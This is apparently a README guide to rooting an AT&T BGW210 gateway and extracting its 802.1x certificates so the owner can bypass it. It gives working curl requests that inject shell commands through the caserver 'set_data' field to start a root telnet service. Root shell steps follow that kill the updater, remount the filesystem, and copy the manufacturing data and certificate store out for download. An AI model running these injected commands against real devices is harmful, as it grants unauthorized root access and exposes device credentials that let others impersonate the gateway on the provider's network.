# BypassAttRG

This method works to rip the 802.1x keys from BGW210.

<!-- **Background**: I switched to AT&T fiber and I hate AT&T's residential gateways -->


## Menu
- [Prerequisites](#prerequisites)
- [Extract Certificates](#extract-certificates)
- [Configuring 802.1x authentication](#configuring-8021x-authentication)
- [Miscellaneous](#miscellaneous)
- [Credits & References](#credits--references)

  
## Prerequisites
- [Python 3](https://www.python.org/downloads/release/python-373/) for the local http server. There are many alternatives(e.g. [mobaxterm](https://mobaxterm.mobatek.net/)).
- Basic knowledge of POSIX commands (cd, mkdir, wget, etc.).
- A BGW210

[Back to menu](#menu)
## Extract Certificates
The certificates extracted from both NVG589 and NVG599 work. 
- [BGW210](#bgw210)

### BGW210
Once downgraded, go to http://192.168.1.254/cgi-bin/ipalloc.ha , type your device access code to login, and assign a static IP to your PC that you'll be executing the CURL commands from.

I assigned my PC: 192.168.1.70 since that's what the RG's DHCP-Server had assigned it.

Once you assign a static IP,  refresh your PC's local ip address. using ifconfig, or ipconfig if on windows (cmd prompt: ipconfig /release and then ipconfig /renew). You may ignore this step if you assigned the same IPv4 it received by the DHCP-Server.

Once that's done, open http://192.168.1.254/cgi-bin/ipalloc.ha and authenticate again if it asks.

Once you authenticate, run these CURL commands (remember to navigate to cURL, see my video for help.

(tech has no password when prompted)

  ```
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -a /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -s|" -v --http1.1 https://192.168.1.254:49955/caserver
 
curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| reboot|" -v --http1.1 https://192.168.1.254:49955/caserver
  ```
 
The AT&T RG (BGW210) will reboot after the final command, and you'll be able to telnet on port 28 as admin w/ device access code as the password once it reboots. 

(Use Putty if using a Windows PC)
 
Once you're logged in via telnet, type ! and press enter to elevate to a root sh terminal

Now, type top and let the telnet terminal populate with the running processes of the RG.

Once the top command displays all of the running process, look for a process labelled:   
/usr/bin/udpsvd -E 0 69 tftpd /lib/firmware

Press CTRL + C to break out of the top command.

Type kill PID_number_of_udpsvd; 
For example: kill 1048 (in the video I mistook the other four digit number for the PIV by mistake initially, then corrected myself).

This kills the auto update script so that you can make changes, or copy your 802.11x certificates without the ATT firmware automatically updating when you aren't ready for it. Not really as important if you don't have the RG connected to the ONT (I didn't in the video).

#### Extract Certificates
- In BGW210, run the following commands in order. Make sure you are in root shell. Reminder - Type `!`. It switches to root shell.
  ```
  mount -o remount,rw /dev/ubi0 /  
  mount mtd:mfg -t jffs2 /mfg
  cp /mfg/mfg.dat /www/att/mfg.dat
  mount mtd:mfg -t jffs2 /mfg
  Download: http://192.168.1.254/mfg.dat
  
  ## Next:
  
  cd /tmp
  tar cf cert.tar /etc/rootcert/
  cp cert.tar /www/att/images
  Download: http://192.168.1.254/images/cert.tar
  ```
- Reminder: Download http://192.168.1.254/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.


[Back to menu](#menu)
## Configuring 802.1x authentication
### Decode Credentials 
Credit: [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)

- Download decoder v1.0.4: [win](decoder/win/mfg_dat_decode_1_04.zip), [linux](decoder/linux/mfg_dat_decode_1_04.tar.gz), [mac](decoder/mac/mfg_dat_decode_1_04_macosx.zip)
  - [Original download page](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)
- Copy *mfg.dat*, unzip *cert.tar* to the same location as *mfg_dat_decode*.
- Run *mfg_dat_decode*. You should get a file like this: *EAP-TLS_8021x_XXXX*.

## Miscellaneous

### Compile Entware packages from source
Some useful links
- [Compile-packages-from-sources](https://github.com/Entware/Entware/wiki/Compile-packages-from-sources)
- [Compile-custom-programs-from-source](https://github.com/RMerl/asuswrt-merlin/wiki/Compile-custom-programs-from-source)

[Back to menu](#menu)
## Credits & References
- [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html): EAP-TLS credentials decoder and the method to extract */mfg/mfg.dat*
- [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui): Rooting The NVG510 from the WebUI
- [nomotion](https://www.nomotion.net/blog/sharknatto/): NVG589 root exploit
- [dslreports.com](https://www.dslreports.com/forum/uverse): A great forum with many useful information.
- [jsolo1@dslreports.com](https://www.dslreports.com/profile/422016): Provides many helpful & useful suggestions.
- [Streiw](https://www.reddit.com/r/ATT/comments/g59rwm/bgw210700_root_exploitbypass/): Creator of BGW210 Pastebin guide and discover of exploit and main hero of BGW210 root.

[Back to menu](#menu)
